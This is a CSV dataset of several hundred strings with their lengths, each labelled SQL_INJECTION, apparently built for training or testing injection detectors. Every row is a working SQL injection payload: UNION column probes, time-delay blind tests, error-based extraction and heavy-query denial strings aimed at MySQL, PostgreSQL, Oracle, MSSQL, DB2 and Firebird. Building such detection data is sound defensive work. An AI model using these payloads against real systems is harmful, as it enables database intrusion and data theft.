payload,length,label
"-5911 union all select 2245,2245,2245,2245,2245,2245#",53,SQL_INJECTION
"1))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (((7484=7484",129,SQL_INJECTION
"1%""))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (((""%""=""",221,SQL_INJECTION
"-8043%""))) or make_set(9354=9354,7185) and (((""%""=""",51,SQL_INJECTION
"-9062"" or 6872=6872 and ""aumq"" like ""aumq",41,SQL_INJECTION
"1)) as zoso where 3633=3633;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",119,SQL_INJECTION
"1'||(select 'bccx' where 5881=5881 and elt(1210=1210,sleep(5)))||'",66,SQL_INJECTION
"1 where 8948=8948 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",221,SQL_INJECTION
"1,(select * from generate_series(5609,5609,case when (5609=5609) then 1 else 0 end) limit 1)",92,SQL_INJECTION
"1""));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",89,SQL_INJECTION
-8760) where 8277=8277 union all select 8277--,46,SQL_INJECTION
"1))) union all select null,null,null,null,null,null,null,null,null,null#",72,SQL_INJECTION
"1""));select (case when (4690=4373) then 4690 else 1/(select 0) end)--",69,SQL_INJECTION
"1) as hlit where 4973=4973 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",117,SQL_INJECTION
"1%'))) union all select null,null,null,null,null,null--",55,SQL_INJECTION
-2022))) or 6812=3516 and (((3896=3896,38,SQL_INJECTION
1%' and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and '%'=',194,SQL_INJECTION
"1"" where 5845=5845 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",117,SQL_INJECTION
"1'+(select 'midn' where 2819=2819 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))+'",129,SQL_INJECTION
1%' waitfor delay '0:0:5'--,27,SQL_INJECTION
1')) union all select null--,28,SQL_INJECTION
1') as gsjr where 7046=7046 and sleep(5)#,41,SQL_INJECTION
"1"" and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)",94,SQL_INJECTION
"-7746') union all select 1998,1998,1998,1998,1998,1998,1998,1998#",65,SQL_INJECTION
"-8409%') or make_set(9354=9354,7185) and ('%'='",47,SQL_INJECTION
"1')));select count(*) from generate_series(1,5000000) and ((('ldqq'='ldqq",73,SQL_INJECTION
"1%"" and 1343=5939#",18,SQL_INJECTION
"1) and elt(3114=3114,sleep(5))#",31,SQL_INJECTION
"1"")));select count(*) from generate_series(1,5000000) and (((""uydm""=""uydm",73,SQL_INJECTION
"1) where 9206=9206 union all select null,null,null,null,null,null#",66,SQL_INJECTION
-8045))) order by 1--,21,SQL_INJECTION
"-3283) where 1948=1948 union all select 1948,1948,1948#",55,SQL_INJECTION
"1')) as fjbe where 4662=4662 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",135,SQL_INJECTION
1%') and (3020=3020)*6703 and ('%'=',36,SQL_INJECTION
"1 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)# dbzk",82,SQL_INJECTION
"1'||(select 'gopc' where 7386=7386 and make_set(9375=7963,7963))||'",67,SQL_INJECTION
"1 where 8389=8389 union all select null,null,null,null,null,null,null,null,null,null#",85,SQL_INJECTION
"1);call regexp_substring(repeat(right(char(3702),0),500000000),null) and (9646=9646",83,SQL_INJECTION
1)));select sleep(5)#,21,SQL_INJECTION
"1)) as wufr where 5239=5239 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",122,SQL_INJECTION
"-1475"") union all select 8611,8611,8611#",40,SQL_INJECTION
1' waitfor delay '0:0:5' and 'jree'='jree,41,SQL_INJECTION
1) where 1203=1203 rlike (select * from (select(sleep(5)))vwyq)#,64,SQL_INJECTION
1') as gdie where 8133=8133 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,89,SQL_INJECTION
"1"") rlike (select (case when (5746=5367) then 1 else 0x28 end)) and (""hnnf"" like ""hnnf",86,SQL_INJECTION
"1%'))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",104,SQL_INJECTION
"-7731"")) or make_set(2551=4389,4389) and ((""unly"" like ""unly",60,SQL_INJECTION
1') where 4003=4003;select sleep(5)#,36,SQL_INJECTION
"-5776%' union all select 3075,3075,3075,3075,3075--",51,SQL_INJECTION
"1' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and 'fsvr'='fsvr",217,SQL_INJECTION
"1"" where 1852=1852 union all select null,null,null,null,null,null,null,null,null#",81,SQL_INJECTION
"1')) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (('wcmt'='wcmt",131,SQL_INJECTION
"1'+(select 'nzgq' where 7230=7230 and elt(1210=1210,sleep(5)))+'",64,SQL_INJECTION
"1) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)",132,SQL_INJECTION
"1')) as icik where 1440=1440 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",131,SQL_INJECTION
"1"")) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""sjiz"" like ""sjiz",133,SQL_INJECTION
"1"") where 9770=9770 union all select null,null,null,null,null,null--",68,SQL_INJECTION
"1%';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and '%'='",96,SQL_INJECTION
"1)) as hpxw where 1826=1826 union all select null,null,null,null,null,null,null,null#",85,SQL_INJECTION
"1"") and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""udlh""=""udlh",127,SQL_INJECTION
"1'))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('ofko'='ofko",119,SQL_INJECTION
"1"" where 6200=6200 and elt(1210=1210,sleep(5))--",48,SQL_INJECTION
-2983') or 8571=8571--,22,SQL_INJECTION
"1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('pbqg'='pbqg",160,SQL_INJECTION
"1'+(select 'xqpe' where 4020=4020 union all select null,null--",62,SQL_INJECTION
"1"")) and (select * from (select(sleep(5)))fzno) and ((""ykhp"" like ""ykhp",71,SQL_INJECTION
"-2384'||(select 'vhcp' from dual where 1266=1266 union all select 1266,1266,1266,1266--",87,SQL_INJECTION
-5751) as jybu where 4739=4739 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,212,SQL_INJECTION
"1%"") or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""%""=""",170,SQL_INJECTION
"1"") union all select null,null,null,null,null,null,null,null,null#",66,SQL_INJECTION
"1')) as ovbz where 3203=3203 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",228,SQL_INJECTION
"1"") where 4182=4182 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",123,SQL_INJECTION
"1"")) as uzvu where 2458=2458 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",200,SQL_INJECTION
"1' in boolean mode) and 8635=(select count(*) from generate_series(1,5000000))--",80,SQL_INJECTION
"-4679 where 9634=9634 union all select 9634,9634,9634,9634,9634,9634,9634--",75,SQL_INJECTION
"1)) as pxmz where 2596=2596;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",119,SQL_INJECTION
"1%"") and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""%""=""",166,SQL_INJECTION
"-8599)) or elt(5628=2324,2324) and ((1134=1134",46,SQL_INJECTION
"-1438 where 6759=6759 union all select 6759,6759#",49,SQL_INJECTION
"-2340%"" order by 1#",19,SQL_INJECTION
"1'+(select 'qvif' where 1758=1758 union all select null,null,null,null,null,null,null,null#",91,SQL_INJECTION
1'+(select 'luhy' where 3112=3112 and (3020=3020)*6703)+',57,SQL_INJECTION
"1"") and elt(1889=7397,7397) and (""kuau""=""kuau",45,SQL_INJECTION
"1"") as eibf where 5026=5026 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",228,SQL_INJECTION
1) as qywz where 1864=1864 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,209,SQL_INJECTION
-2820')) or 6679=8848--,23,SQL_INJECTION
-8777%'))) or (3934=2025)*2025 and ((('%'=',43,SQL_INJECTION
"1') as keom where 7524=7524 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",180,SQL_INJECTION
"1')) and elt(1210=1210,sleep(5)) and (('jnmf'='jnmf",51,SQL_INJECTION
"-1915%"")) union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732#",72,SQL_INJECTION
"1 and 8407=(select count(*) from generate_series(1,5000000))",60,SQL_INJECTION
1') as jxtg where 1071=1071 and sleep(5)--,42,SQL_INJECTION
"-5640"")) or 9792=2728--",23,SQL_INJECTION
1%')));waitfor delay '0:0:5'--,30,SQL_INJECTION
"-9347') union all select 3884,3884#",35,SQL_INJECTION
"1' in boolean mode) union all select null,null,null,null,null,null,null,null,null#",82,SQL_INJECTION
"1,(select (case when (2106=2106) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else 2106*(select 2106 from master..sysdatabases) end))",235,SQL_INJECTION
"1"") where 4588=4588;begin dbms_lock.sleep(5); end--",51,SQL_INJECTION
-7742) as tgzq where 7842=7842 or 2062=1563,43,SQL_INJECTION
1 or sleep(5)-- nrzf,20,SQL_INJECTION
1')) or sleep(5) and (('uzhd' like 'uzhd,40,SQL_INJECTION
"-9583%"")) union all select 9349,9349,9349,9349,9349,9349,9349--",63,SQL_INJECTION
"1%"");select * from generate_series(1488,1488,case when (1488=1685) then 1 else 0 end) limit 1--",95,SQL_INJECTION
"1"" where 5796=5796 and sleep(5)#",32,SQL_INJECTION
select 'qqpjq'||(case 5118 when 5118 then 1 else 0 end)||'qzvzq' from rdb$database,82,SQL_INJECTION
1' and sleep(5)#,16,SQL_INJECTION
"1"")))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (((""kfdh"" like ""kfdh",227,SQL_INJECTION
1%' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and '%'=',107,SQL_INJECTION
"1' or elt(6272=6272,sleep(5)) and 'vrim'='vrim",46,SQL_INJECTION
"1 where 5332=5332 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",189,SQL_INJECTION
"1"" where 4672=4672;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",102,SQL_INJECTION
"1 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)-- xlfz",109,SQL_INJECTION
"-1526"") where 4870=4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",91,SQL_INJECTION
1'+(select 'diet' where 7004=7004 rlike sleep(5))+',51,SQL_INJECTION
"-3817"") as vugz where 3064=3064 or 9323=9323#",45,SQL_INJECTION
1');begin user_lock.sleep(5); end--,35,SQL_INJECTION
"1')) union all select null,null,null,null,null,null--",53,SQL_INJECTION
"1%'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('%'='",174,SQL_INJECTION
1'+(select xzse where 4530=4530;(select * from (select(sleep(5)))srmq))+',73,SQL_INJECTION
"1"")) as exzo where 7518=7518 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",228,SQL_INJECTION
"1')) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('acly' like 'acly",168,SQL_INJECTION
"1"") as hblk where 7982=7982 and 9611=6142--",43,SQL_INJECTION
"1) where 1622=1622;select benchmark(5000000,md5(0x4c4d6142))--",62,SQL_INJECTION
1%')) waitfor delay '0:0:5' and (('%'=',39,SQL_INJECTION
"1' in boolean mode) or elt(5873=5873,sleep(5))#",47,SQL_INJECTION
1') as yqld where 2489=2489;waitfor delay '0:0:5'--,51,SQL_INJECTION
"-5597') or make_set(2490=2164,2164)",35,SQL_INJECTION
"1'||(select 'jfxs' from dual where 5485=5485 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",152,SQL_INJECTION
"1%"")));select * from generate_series(9964,9964,case when (9964=4455) then 1 else 0 end) limit 1--",97,SQL_INJECTION
"1"") where 9680=9680 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",177,SQL_INJECTION
"1) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (8898=8898",91,SQL_INJECTION
"1%"");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (""%""=""",105,SQL_INJECTION
1') where 4867=4867 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,81,SQL_INJECTION
"1') as wnys where 6457=6457 or 8514=benchmark(5000000,md5(0x544d5a4c))#",71,SQL_INJECTION
"1' in boolean mode) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)#",124,SQL_INJECTION
1;select pg_sleep(5)# pjvi,26,SQL_INJECTION
"1' where 4334=4334 or elt(5873=5873,sleep(5))#",46,SQL_INJECTION
"1') where 3331=3331 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",171,SQL_INJECTION
1)) as iihk where 5414=5414 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,232,SQL_INJECTION
"1)) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((5507=5507",113,SQL_INJECTION
"1"";select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",86,SQL_INJECTION
"-5706"")) union all select 2013,2013,2013,2013#",46,SQL_INJECTION
1' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'ukzb'='ukzb,206,SQL_INJECTION
1' rlike sleep(5),17,SQL_INJECTION
"-4550"") as hlwe where 6026=6026 or (9364=9593)*9593--",53,SQL_INJECTION
1) rlike (select (case when (5477=7492) then 1 else 0x28 end)) and (4427=4427,77,SQL_INJECTION
1) as qkkm where 8461=8461;select (case when (9030=9185) then 9030 else 9030*(select 9030 from information_schema.character_sets) end)#,135,SQL_INJECTION
1) where 4548=4548 and 9198=9198--,34,SQL_INJECTION
"elt(2427=2427,5518)",19,SQL_INJECTION
"-9007) as gill where 6462=6462 union all select 6462,6462,6462,6462,6462,6462,6462,6462,6462#",93,SQL_INJECTION
1 where 1568=1568 or (select * from (select(sleep(5)))sddo)#,60,SQL_INJECTION
-2866')) or 4491=9429#,22,SQL_INJECTION
"1%"")) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""%""=""",123,SQL_INJECTION
"-4586 union all select 2068,2068,2068,2068--",44,SQL_INJECTION
"-2717"" or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",137,SQL_INJECTION
"1,(select (case when (8674=7896) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",96,SQL_INJECTION
"1);select count(*) from generate_series(1,5000000)",50,SQL_INJECTION
"1')) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (('vedm'='vedm",115,SQL_INJECTION
1)) as ojjk where 3687=3687 and (4833=9218)*9218--,50,SQL_INJECTION
"-4165"" where 1772=1772 union all select 1772,1772,1772,1772,1772,1772,1772,1772--",81,SQL_INJECTION
"1);select benchmark(5000000,md5(0x714e4153))#",45,SQL_INJECTION
1' where 1770=1770;select (case when (5569=9390) then 5569 else 1/(select 0) end)--,83,SQL_INJECTION
"1') and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('snad' like 'snad",177,SQL_INJECTION
"1"") as yzzk where 1813=1813 and (3020=3020)*6703--",50,SQL_INJECTION
"1%';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",100,SQL_INJECTION
"1"") as eefe where 5290=5290 and (select * from (select(sleep(5)))gcrr)#",71,SQL_INJECTION
"1"" and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""gxhz""=""gxhz",215,SQL_INJECTION
1%' and sleep(5)#,17,SQL_INJECTION
"1%"") and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""%""=""",247,SQL_INJECTION
"-9864"") or elt(5885=4936,4936) and (""bfbb"" like ""bfbb",53,SQL_INJECTION
1' rlike (select * from (select(sleep(5)))sgvo) and 'vnkr' like 'vnkr,69,SQL_INJECTION
"1') where 2284=2284 and make_set(8403=8403,8899)--",50,SQL_INJECTION
